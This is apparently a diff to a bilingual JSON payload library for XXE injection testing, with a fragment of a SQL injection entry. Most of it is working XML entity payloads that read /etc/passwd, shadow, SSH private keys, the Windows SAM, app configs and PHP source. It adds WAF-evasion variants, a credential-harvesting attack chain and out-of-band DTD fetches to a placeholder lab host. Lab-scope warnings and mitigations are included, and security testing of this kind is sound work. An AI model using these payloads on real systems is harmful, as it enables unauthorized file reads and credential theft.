+          "en": "Use parameterized queries with fixed query structure, mapping dynamic ordering/columns through server-side allowlists; decode exactly once at the boundary and application without relying on the WAF to fix injection, keep database accounts least-privileged, and regression-test every encoding variant."
+        },
+        "difficulty": "advanced"
+      },
+      "analysis": {
+        "zh": "区分边界放行、数据库语法接受和测试数据回显三个层级。只有最终 SQL 和结果证据能确认 UNION 注入，WAF 差异本身不能。",
+        "en": "Separate edge acceptance, database syntax acceptance, and test-data output. Only final SQL and result evidence confirm UNION injection; a WAF differential alone does not."
+      },
+      "review": {
+        "decision": "payload",
+        "rationale": "WAF1 批次3：按报告 §6 候选2 追加 MySQL 8 TABLE 语句与嵌套注释差分 变体（原 4 条下标不变、不重排不删除，新变体追加在末尾）。"
+      }
+    },
+    {
+      "id": "xxe-file-read",
+      "name": {
+        "zh": "XXE 本地文件实体读取",
+        "en": "XXE Local File Entity Read"
+      },
+      "description": {
+        "zh": "覆盖 XXE 本地文件读取验证：从 /etc/passwd 与 Windows win.ini，到应用配置文件与源代码读取，并附参数实体变体，用于确认 XML 解析器的文件实体暴露面。",
+        "en": "Covers XXE local file read validation: from /etc/passwd and Windows win.ini through application configuration and source-code reads, with parameter-entity variants, confirming the file-entity exposure of XML parsers."
+      },
+      "category": {
+        "zh": "XXE实体注入",
+        "en": "XXE XML Entity Injection"
+      },
+      "subCategory": {
+        "zh": "通用与 XSLT 文件读取",
+        "en": "Generic XML & XSLT File Read"
+      },
+      "tags": [
+        "xxe",
+        "file",
+        "read",
+        "lfi"
+      ],
+      "prerequisites": [
+        {
+          "zh": "确认 XXE 沙箱文件实体验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。",
+          "en": "Confirm that the target, accounts, data, component version, and stop conditions for XXE Sandbox File-Entity Validation are inside a reversible authorized lab scope."
+        },
+        {
+          "zh": "准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。",
+          "en": "Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state."
+        }
+      ],
+      "execution": [
+        {
+          "title": {
+            "zh": "读取 /etc/passwd",
+            "en": "Read /etc/passwd"
+          },
+          "command": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"file://{FILE_PATH}\">\n]>\n<foo>&xxe;</foo>",
+          "description": {
+            "zh": "用内部实体读取目标文件验证文件读取；回显出现文件内容即确认读取成功。其余可选目标：file:///etc/shadow、file:///etc/hosts、file:///root/.ssh/id_rsa、file:///proc/self/environ。",
+            "en": "Read the target file via an internal entity to confirm file read; the content in the response confirms success. Other candidate targets: file:///etc/shadow, file:///etc/hosts, file:///root/.ssh/id_rsa, file:///proc/self/environ."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
+              "explanation": {
+                "zh": "读取 /etc/passwd 的外部实体",
+                "en": "External entity reading /etc/passwd"
+              },
+              "type": "keyword"
+            },
+            {
+              "part": "&xxe;",
+              "explanation": {
+                "zh": "实体引用展开文件内容",
+                "en": "Entity reference expanding the file content"
+              },
+              "type": "keyword"
+            }
+          ],
+          "platform": "linux",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "读取 Windows win.ini",
+            "en": "Read Windows win.ini"
+          },
+          "command": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">\n]>\n<foo>&xxe;</foo>",
+          "description": {
+            "zh": "用内部实体读取 win.ini 验证 Windows 文件读取；回显出现 win.ini 内容即确认读取成功。其余可选目标：file:///c:/windows/system32/config/sam、file:///c:/users/administrator/.ssh/id_rsa。",
+            "en": "Read win.ini via an internal entity to confirm Windows file read; win.ini content in the response confirms success. Other candidate targets: file:///c:/windows/system32/config/sam, file:///c:/users/administrator/.ssh/id_rsa."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">",
+              "explanation": {
+                "zh": "读取 win.ini 的外部实体",
+                "en": "External entity reading win.ini"
+              },
+              "type": "keyword"
+            },
+            {
+              "part": "&xxe;",
+              "explanation": {
+                "zh": "实体引用展开文件内容",
+                "en": "Entity reference expanding the file content"
+              },
+              "type": "keyword"
+            }
+          ],
+          "platform": "windows",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "读取应用配置文件",
+            "en": "Read application config files"
+          },
+          "command": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"file://{WEB_ROOT}/config.php\">\n]>\n<foo>&xxe;</foo>",
+          "description": {
+            "zh": "用内部实体读取应用配置文件验证敏感信息读取；回显出现配置内容即确认敏感文件可读。其余可选目标：file:///var/www/html/wp-config.php、file:///app/.env、file:///app/config/database.yml。",
+            "en": "Read an application config file via an internal entity to confirm sensitive-file access; config content in the response confirms success. Other candidate targets: file:///var/www/html/wp-config.php, file:///app/.env, file:///app/config/database.yml."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<!ENTITY xxe SYSTEM \"file:///var/www/html/config.php\">",
+              "explanation": {
+                "zh": "读取 config.php 的外部实体",
+                "en": "External entity reading config.php"
+              },
+              "type": "keyword"
+            },
+            {
+              "part": "&xxe;",
+              "explanation": {
+                "zh": "实体引用展开文件内容",
+                "en": "Entity reference expanding the file content"
+              },
+              "type": "keyword"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "读取源代码",
+            "en": "Read Source Code"
+          },
+          "command": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource={WEB_ROOT}/index.php\">\n]>\n<foo>&xxe;</foo>",
+          "description": {
+            "zh": "以 php://filter Base64 读取目标源码文件；回显 Base64 串且解码得到源码即确认源码读取链可用。",
+            "en": "Read the target source file via php://filter Base64; a Base64 string that decodes to source confirms the source-read chain."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<?xml version=\"1.0\"?>",
+              "explanation": {
+                "zh": "XML声明",
+                "en": "XML declaration"
+              },
+              "type": "tag"
+            },
+            {
+              "part": "php://filter/convert.base64-encode",
+              "explanation": {
+                "zh": "filter链Base64编码包装：防止PHP文件被执行",
+                "en": "Base64 filter prevents execution"
+              },
+              "type": "parameter"
+            },
+            {
+              "part": "resource=/var/www/html/index.php",
+              "explanation": {
+                "zh": "被读取的源码文件",
+                "en": "Source file being read"
+              },
+              "type": "value"
+            },
+            {
+              "part": "<foo>&xxe;</foo>",
+              "explanation": {
+                "zh": "引用实体触发读取，响应返回Base64源码",
+                "en": "Entity reference returns encoded source"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        }
+      ],
+      "opsecTips": [
+        {
+          "zh": "实体读取限定实验文件与合成配置——真实系统文件不进入验证清单；读取内容即验即弃。",
+          "en": "Point entity reads at lab files and synthetic configs only — no real system files on the list — and discard read content right after checking."
+        },
+        {
+          "zh": "出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。",
+          "en": "Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "使用参数实体",
+            "en": "Use parameter entities"
+          },
+          "command": "<?xml version=\"1.0\"?> \n <!DOCTYPE foo [ \n <!ENTITY % dtd SYSTEM \"http://{LAB_OAST}/read.dtd\"> \n %dtd; \n ]> \n <foo>&bar;</foo>",
+          "description": {
+            "zh": "以参数实体包装文件实体读取；仍能回显目标文件内容即确认参数实体形式可用、仅拦通用实体的过滤被绕过。",
+            "en": "Wrap the file entity in a parameter entity; the target file content still reflected confirms the parameter-entity form works and filters that only block general entities are bypassed."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">",
+              "explanation": {
+                "zh": "参数实体指向passwd(%声明参数实体)",
+                "en": "Parameter entity reads passwd"
+              },
+              "type": "tag"
+            },
+            {
+              "part": "<!ENTITY bar \"%xxe;\">",
+              "explanation": {
+                "zh": "普通实体引用参数实体的值",
+                "en": "General entity references parameter entity"
+              },
+              "type": "tag"
+            },
+            {
+              "part": "<foo>&bar;</foo>",
+              "explanation": {
+                "zh": "文档中引用普通实体完成回显",
+                "en": "Reference triggers the chain"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "无 XML 声明压缩形态",
+            "en": "Declaration-Free Compact Form"
+          },
+          "command": "<!DOCTYPE r[<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
+          "description": {
+            "zh": "去掉 <?xml 声明并压缩空白，规避“声明+DOCTYPE”完整结构匹配；成功判据：passwd 内容回显。",
+            "en": "Drops the <?xml declaration and whitespace to evade matching of the full declaration+DOCTYPE structure. Success: passwd contents echoed."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<!DOCTYPE r[",
+              "explanation": {
+                "zh": "文档类型声明",
+                "en": "Document type declaration"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "<!ENTITY x SYSTEM",
+              "explanation": {
+                "zh": "外部实体声明",
+                "en": "External entity declaration"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "file:///etc/passwd",
+              "explanation": {
+                "zh": "系统文件目标",
+                "en": "System file target"
+              },
+              "type": "url"
+            },
+            {
+              "part": "&x;</r>",
+              "explanation": {
+                "zh": "根元素内实体引用",
+                "en": "Entity ref inside root"
+              },
+              "type": "payload"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "file 协议单斜杠变体",
+            "en": "Single-Slash file Scheme Variant"
+          },
+          "command": "<?xml version=\"1.0\"?><!DOCTYPE r[<!ENTITY x SYSTEM \"file:/etc/passwd\">]><r>&x;</r>",
+          "description": {
+            "zh": "利用 file:/ 与 file:/// 等价性绕过 file:/// 固定前缀检测；成功判据：文件内容仍被读取。",
+            "en": "Exploits equivalence of file:/ and file:/// to bypass the fixed file:/// prefix check. Success: the file is still read."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<?xml version=\"1.0\"?>",
+              "explanation": {
+                "zh": "XML声明头",
+                "en": "XML declaration"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "file:/etc/passwd",
+              "explanation": {
+                "zh": "单斜杠文件URI",
+                "en": "Single-slash file URI"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "&x;</r>",
+              "explanation": {
+                "zh": "根元素内实体引用",
+                "en": "Entity ref inside root"
+              },
+              "type": "payload"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "/proc/self 变体",
+            "en": "/proc/self Variant"
+          },
+          "command": "<?xml version=\"1.0\"?><!DOCTYPE r[<!ENTITY x SYSTEM \"file:///proc/self/environ\">]><r>&x;</r>",
+          "description": {
+            "zh": "换读 /proc/self/environ 规避对 /etc/passwd 路径的专项规则；成功判据：环境变量内容回显。",
+            "en": "Reads /proc/self/environ instead to dodge rules specific to /etc/passwd. Success: environment variables are echoed."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<!DOCTYPE r[",
+              "explanation": {
+                "zh": "文档类型声明",
+                "en": "Document type declaration"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "file:///proc/self/environ",
+              "explanation": {
+                "zh": "进程环境目标",
+                "en": "Process environment target"
+              },
+              "type": "url"
+            },
+            {
+              "part": "&x;</r>",
+              "explanation": {
+                "zh": "根元素内实体引用",
+                "en": "Entity ref inside root"
+              },
+              "type": "payload"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "通用 XML 本地文件实体",
+            "en": "Generic XML Local-File Entities"
+          },
+          "command": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]><root>&xxe;</root>",
+          "description": {
+            "zh": "以通用 XML 本地实体读取两个平台路径；解析后回显 marker 内容即确认本地实体读取可用。执行前把两个系统路径按目标平台改为工作目录内不同随机 marker 文件。",
+            "en": "Read two platform paths via generic XML local entities; marker content in the parsed output confirms local-entity reads. Before execution replace both system paths with distinct random marker files in the working directory for the target platform."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<!DOCTYPE foo [",
+              "explanation": {
+                "zh": "文档类型声明",
+                "en": "Document type declaration"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "file:///etc/passwd",
+              "explanation": {
+                "zh": "Linux系统文件目标",
+                "en": "Linux system file target"
+              },
+              "type": "url"
+            },
+            {
+              "part": "file:///c:/windows/system32/drivers/etc/hosts",
+              "explanation": {
+                "zh": "Windows主机文件目标",
+                "en": "Windows hosts file target"
+              },
+              "type": "url"
+            },
+            {
+              "part": "&xxe;",
+              "explanation": {
+                "zh": "实体引用读取文件",
+                "en": "Entity reference reads the file"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "<root>",
+              "explanation": {
+                "zh": "最小根元素",
+                "en": "Minimal root element"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "路径点号混淆变体",
+            "en": "Dot-Segment Path Obfuscation Variant"
+          },
+          "command": "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY x SYSTEM \"file:///etc/./passwd\">]><x>&x;</x>",
+          "description": {
+            "zh": "在路径中插入 /./ 空层级段，规避对 file:///etc/passwd 固定串的匹配；点号段等价性依赖解析器侧路径归一化，未归一化的解析器按字面寻径会打开失败；补充差分点：部分解析器会在 SYSTEM 标识符内解码 &#101;tc 这类数字实体，多数按字面处理，同一命令的实体写法可作解析器指纹判别（本命令保持明文路径）。成功判据：WAF 放行且文件内容仍回显；失效条件：解析器不做点号段归一化，或过滤层在归一化后二次复检。",
+            "en": "Inserts empty /./ dot segments into the path to dodge rules matching the literal file:///etc/passwd string. The equivalence only holds where the parser normalizes the path; parsers that skip normalization resolve it literally and the open fails. Extra differential: a few parsers decode numeric entities such as &#101;tc inside SYSTEM identifiers while most treat them literally, so the same command written in entity form doubles as a parser fingerprint probe (this command keeps the path plaintext). Success: the rule lets the document through and file contents still echo. Fails when the parser skips dot-segment normalization or the filter re-inspects after normalizing."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "/./",
+              "explanation": {
+                "zh": "空层级点号段，归一化后等价删除",
+                "en": "Empty dot segment, removed during path normalization"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "file:///etc/passwd",
+              "explanation": {
+                "zh": "归一化后等价的目标路径",
+                "en": "Equivalent target path after normalization"
+              },
+              "type": "url"
+            },
+            {
+              "part": "&x;",
+              "explanation": {
+                "zh": "根元素内实体引用读取文件",
+                "en": "Entity reference inside the root reads the file"
+              },
+              "type": "operator"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "CDATA 上下文包装变体",
+            "en": "CDATA Context Wrapping Variant"
+          },
+          "command": "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY x SYSTEM \"file://{FILE_PATH}\">]><x><![CDATA[prefix]]>&x;<![CDATA[suffix]]></x>",
+          "description": {
+            "zh": "实体引用夹在 CDATA 段之间，打断 &x;</x> 结尾特征；成功判据：文件内容与前后缀一同输出。",
+            "en": "Sandwiches the reference between CDATA sections to break the &x;</x> ending signature. Success: file contents output alongside the prefixes."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<![CDATA[prefix]]>",
+              "explanation": {
+                "zh": "CDATA前缀段",
+                "en": "CDATA prefix section"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "&x;",
+              "explanation": {
+                "zh": "夹层实体引用",
+                "en": "Sandwiched entity reference"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "<![CDATA[suffix]]>",
+              "explanation": {
+                "zh": "CDATA后缀段",
+                "en": "CDATA suffix section"
+              },
+              "type": "payload"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "深嵌套元素变体",
+            "en": "Deeply Nested Element Variant"
+          },
+          "command": "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY x SYSTEM \"file://{FILE_PATH}\">]><x><a><b><c><d><e>&x;</e></d></c></b></a></x>",
+          "description": {
+            "zh": "引用置于多层嵌套深处，规避对根节点直引的浅层规则；成功判据：深层解析展开实体。",
+            "en": "Places the reference deep in nested elements to evade shallow rules on root-level references. Success: deep parsing expands the entity."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<a><b><c><d><e>",
+              "explanation": {
+                "zh": "五层嵌套元素",
+                "en": "Five-level nested elements"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "&x;</e>",
+              "explanation": {
+                "zh": "深层引用实体",
+                "en": "Deep entity reference"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "file://{FILE_PATH}",
+              "explanation": {
+                "zh": "占位文件URI",
+                "en": "Placeholder file URI"
+              },
+              "type": "url"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "通用 XML 外部资源实体",
+            "en": "Generic XML External Resource Entity"
+          },
+          "command": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file://{FILE_PATH}\">]><x>&xxe;</x>\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://{LAB_OAST}/\">]><x>&xxe;</x>",
+          "description": {
+            "zh": "以通用 XML 外部资源实体分别测试 file 与 HTTP 目标；file 行回显 marker、HTTP 行由 {LAB_OAST} 记录请求即确认资源实体可达。按实际通用 XML 入口单独测试，把目标改为 marker，不得打包成 XLSX。",
+            "en": "Test file and HTTP targets separately via generic XML external-resource entities; the file line reflecting the marker and the HTTP line logged by {LAB_OAST} confirm resource-entity reachability. Test only at an actual generic-XML entry, rewrite targets to markers, and never package as XLSX."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<!ENTITY xxe SYSTEM",
+              "explanation": {
+                "zh": "外部实体声明",
+                "en": "External entity declaration"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "file://{FILE_PATH}",
+              "explanation": {
+                "zh": "占位符文件目标",
+                "en": "Placeholder file target"
+              },
+              "type": "url"
+            },
+            {
+              "part": "http://{LAB_OAST}/",
+              "explanation": {
+                "zh": "OAST回连地址",
+                "en": "OAST callback address"
+              },
+              "type": "url"
+            },
+            {
+              "part": "<x>&xxe;</x>",
+              "explanation": {
+                "zh": "根元素引用实体",
+                "en": "Root element references the entity"
+              },
+              "type": "payload"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        },
+        {
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "title": {
+            "zh": "Java netdoc:// 协议等价读取",
+            "en": "Java netdoc:// Protocol Equivalent Read"
+          },
+          "command": "<!DOCTYPE r [<!ENTITY x SYSTEM \"netdoc:///etc/passwd\">]><r>&x;</r>",
+          "description": {
+            "zh": "Java（Xerces/SAX/DOM4j）解析栈在 file:// 被拦截后仍按 file 语义解析 netdoc://，实体展开即回显本地文件内容；成立条件为 Java 解析栈且未禁外部实体。.NET 与 libxml2 不支持该协议而直接失败，因此本变体同时充当解析栈指纹：回显 /etc/passwd 即证明 Java 栈可读，报协议不支持即排除 Java 栈。成功判据：响应正文出现 /etc/passwd 内容。",
+            "en": "Java parsing stacks (Xerces, SAX, DOM4j) resolve netdoc:// with file semantics, so when file:// is blocked the same read still succeeds through netdoc:// and the entity expansion echoes the local file. Preconditions: a Java parsing stack with external entities enabled. .NET and libxml2 lack the scheme and fail outright, which makes the variant a parser-stack fingerprint at the same time: echoed /etc/passwd proves a readable Java stack while a scheme error rules it out. Success: the response body contains the /etc/passwd content."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<!ENTITY x SYSTEM ",
+              "explanation": {
+                "zh": "内部通用实体声明，展开点位于根元素内",
+                "en": "Internal general entity declaration expanded inside the root element"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "netdoc:///etc/passwd",
+              "explanation": {
+                "zh": "Java 专有 netdoc 协议按 file 语义打开本地路径，绕开针对 file:// 的拦截",
+                "en": "The Java-only netdoc scheme opens a local path with file semantics, sidestepping file:// blocks"
+              },
+              "type": "url"
+            }
+          ],
+          "effectiveness": "A"
+        }
+      ],
+      "attackChain": [
+        {
+          "title": {
+            "zh": "读取 passwd 确认文件通道",
+            "en": "Confirm the file channel with passwd"
+          },
+          "description": {
+            "zh": "实体指向系统账户文件提交，响应带出账户列表即确认任意文件读取能力，Linux 侧首先落地稳定读取通道。",
+            "en": "Point the entity at /etc/passwd; the returned account list confirms arbitrary file read on the Linux side."
+          },
+          "payload": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"file://{FILE_PATH}\">\n]>\n<foo>&xxe;</foo>"
+        },
+        {
+          "title": {
+            "zh": "读取 Windows 系统文件",
+            "en": "Read Windows system files"
+          },
+          "description": {
+            "zh": "换目标到 Windows 系统配置文件，内容回显确认该类路径同样可读，按操作系统切换后续目标清单继续收集。",
+            "en": "Switch to c:/windows/win.ini; echoed contents confirm Windows paths read too, tuning the next target list per OS."
+          },
+          "payload": ""
+        },
+        {
+          "title": {
+            "zh": "读取 Web 配置收获凭据",
+            "en": "Harvest credentials from web configs"
+          },
+          "description": {
+            "zh": "指向 Web 根下配置文件，数据库口令与密钥直接暴露在响应中，凭据可用于直连数据库横向扩大控制范围。",
+            "en": "Aim at web root configs like config.php; database passwords and keys surface for direct connection and deeper control."
+          },
+          "payload": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"file://{WEB_ROOT}/config.php\">\n]>\n<foo>&xxe;</foo>"
+        },
+        {
+          "title": {
+            "zh": "filter 编码读取源码",
+            "en": "Read source through filter encoding"
+          },
+          "description": {
+            "zh": "用 php filter 以 base64 编码读取源码文件，绕开解析执行限制，解码后获得完整应用逻辑用于挖掘更多漏洞。",
+            "en": "Base64-read index.php via php://filter to bypass parsing, then decode the full source to hunt further weaknesses."
+          },
+          "payload": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource={WEB_ROOT}/index.php\">\n]>\n<foo>&xxe;</foo>"
+        },
+        {
+          "title": {
+            "zh": "参数实体变体维持读取",
+            "en": "Keep reading with parameter-entity variants"
+          },
+          "description": {
+            "zh": "一般实体被禁时改用参数实体经内部实体中转内容，读取链路保持可用，继续按目标清单收割服务器上的敏感文件数据。",
+            "en": "If general entities are banned, launder contents through parameter entities to keep the read chain alive for further files."
+          },
+          "payload": "<?xml version=\"1.0\"?> \n <!DOCTYPE foo [ \n <!ENTITY % dtd SYSTEM \"http://{LAB_OAST}/read.dtd\"> \n %dtd; \n ]> \n <foo>&bar;</foo>"
+        }
+      ],
+      "references": [
+        "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
+        "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
+      ],
+      "tutorial": {
+        "overview": {
+          "zh": "覆盖 XXE 本地文件读取验证链：/etc/passwd 与 Windows win.ini 平台探测、应用配置文件与源代码读取、php://filter Base64 编码读取。用于确认 XML 解析器的文件实体暴露面与可读取范围。",
+          "en": "Covers the local file-read verification chain for XXE: platform probes against /etc/passwd and Windows win.ini, application config and source-code reads, and php://filter Base64-encoded reads. Used to map the XML parser's file-entity exposure and readable scope."
+        },
+        "vulnerability": {
+          "zh": "根因是解析器允许外部通用实体且 SYSTEM 标识符可指向任意本地路径，实体内容随解析结果回显；应用配置与源码同在读取范围内，php://filter 可编码读取非文本文件。",
+          "en": "The root cause is the parser allowing external general entities whose SYSTEM identifiers can point at any local path, with entity content echoed through parse results; application configs and source code fall in scope, and php://filter reads non-text files in encoded form."
+        },
+        "exploitation": {
+          "zh": "按 Payload 列表顺序使用：第 1 步以内部实体读取 /etc/passwd，回显文件内容即确认读取成功，可按需枚举 shadow、hosts、id_rsa 等路径；第 2 步读 win.ini 验证 Windows 平台；第 3 步读应用配置文件确认敏感信息可读；第 4 步以 php://filter Base64 读取源码，解码即确认非文本读取链。被 WAF 拦截时改用参数实体变体。",
+          "en": "Use in Payload list order: step 1 reads /etc/passwd via an internal entity; echoed file content confirms the read, with optional enumeration of shadow, hosts, id_rsa, and similar paths. Step 2 reads win.ini for Windows; step 3 reads application config files to confirm sensitive data exposure; step 4 reads source via php://filter Base64, decoding to confirm the non-text read chain. When blocked by a WAF, switch to the parameter-entity variant."
+        },
+        "mitigation": {
+          "zh": "解析器禁用 DTD 与外部实体（含 XSLT 路径），解析进程以低权限运行并限制文件系统视图：\n      // XSLT 场景：启用安全处理\n      TransformerFactory tf = TransformerFactory.newInstance();\n      tf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n      // XML 场景：拒绝 DOCTYPE\n      dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n  修复后重放各文件载荷应报实体禁止错误，响应中无任何文件内容。",
+          "en": "Disable DTDs and external entities in the parser, run the parsing process with low privileges and a restricted filesystem view; after the fix, replaying each file payload must raise entity-forbidden errors with no file content in responses."
+        },
+        "difficulty": "advanced"
+      },
+      "analysis": {
+        "zh": "XXE 沙箱文件实体验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。",
+        "en": "XXE Sandbox File-Entity Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites."
+      },
+      "review": {
+        "decision": "payload",
+        "rationale": "WAF1 批次3：按报告 §6 候选3 追加 Java netdoc:// 协议等价读取 变体（原 9 条下标不变、不重排不删除，新变体追加在末尾）。"
+      }
+    },
+    {
+      "id": "ssti2-xxe-external-dtd-fetches",
+      "name": {
+        "zh": "通用 XML 外部 DTD 获取变体",
+        "en": "Generic XML External-DTD Fetch Variants"
+      },
+      "description": {
+        "zh": "归并两个远程参数实体 DTD 文件名变体，验证通用 XML parser 是否获取外部子集，不推断 DTD 后续内容。",
+        "en": "Groups two remote parameter-entity DTD filename variants to test whether a generic XML parser retrieves an external subset without inferring later DTD content."
+      },
+      "category": {
+        "zh": "XXE实体注入",
+        "en": "XXE XML Entity Injection"
+      },
+      "subCategory": {
+        "zh": "外部 DTD 载体获取",
+        "en": "External DTD Carrier Fetch"
+      },
+      "tags": [
+        "xxe",
+        "xml",
+        "parameter-entity",
+        "external-dtd",
+        "oob"
+      ],
+      "prerequisites": [
+        {
+          "zh": "已按实际入口把基础 XML、SVG、Office XML、远程 DTD 和协议 scheme 分配给对应 parser/worker，不将整套集合一次性投递。",
+          "en": "Basic XML, SVG, Office XML, remote DTD, and protocol schemes are mapped to their actual parser or worker entry and the full collection is never submitted at once."
+        },
+        {
+          "zh": "每个格式使用独立合法 fixture、沙箱 marker 和唯一任务/回调 token，记录 parser 能力矩阵、文件/网络审计和派生输出。",
+          "en": "Each format uses an independent valid fixture, sandbox marker, and unique job or callback token, recording a parser capability matrix, file or network audit, and derived output."
+        }
+      ],
+      "execution": [
+        {
+          "title": {
+            "zh": "通用 XML 外部 DTD 获取变体",
+            "en": "Generic XML External-DTD Fetch Variants"
+          },
+          "command": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://{LAB_OAST}/xxe.dtd\">%xxe;]><root>test</root>\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://{LAB_OAST}/xxe_gopher.dtd\">%xxe;]><root>test</root>",
+          "description": {
+            "zh": "以外部参数实体拉取两个 token 化 DTD 路径；{LAB_OAST} 收到两次独立 DTD 请求即确认外部 DTD 获取边界。{LAB_OAST} 渲染为只返回空合法 DTD 的自有端点，不得提供 gopher 或二次实体内容。",
+            "en": "Fetch two tokenized DTD paths via external parameter entities; two independent DTD requests arriving at {LAB_OAST} confirm the external-DTD fetch boundary. {LAB_OAST} renders to your endpoint returning empty valid DTDs only — never gopher or secondary-entity content."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<!ENTITY % xxe SYSTEM",
+              "explanation": {
+                "zh": "参数实体声明",
+                "en": "Parameter entity declaration"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "%xxe;",
+              "explanation": {
+                "zh": "展开触发DTD拉取",
+                "en": "Expansion fetches the DTD"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "http://{LAB_OAST}",
+              "explanation": {
+                "zh": "自有OAST端点",
+                "en": "Owned OAST endpoint"
+              },
+              "type": "url"
+            },
+            {
+              "part": "xxe_gopher.dtd",
+              "explanation": {
+                "zh": "第二个DTD路径token",
+                "en": "Second DTD path token"
+              },
+              "type": "url"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        }
+      ],
+      "opsecTips": [
+        {
+          "zh": "XXE 综合矩阵每轮只测试一个格式/机制并使用 marker；禁止真实文件、元数据、gopher 和公共目标，出现扩张、外连或 worker 压力时停止。",
+          "en": "The XXE matrix tests one format and mechanism per run with a marker; real files, metadata, gopher, and public targets are forbidden, and testing stops on expansion, egress, or worker pressure."
+        },
+        {
+          "zh": "逐格式删除 fixture、marker、DTD/token 和派生产物，关闭监听器，清理各 parser/任务缓存与日志，并更新能力矩阵。",
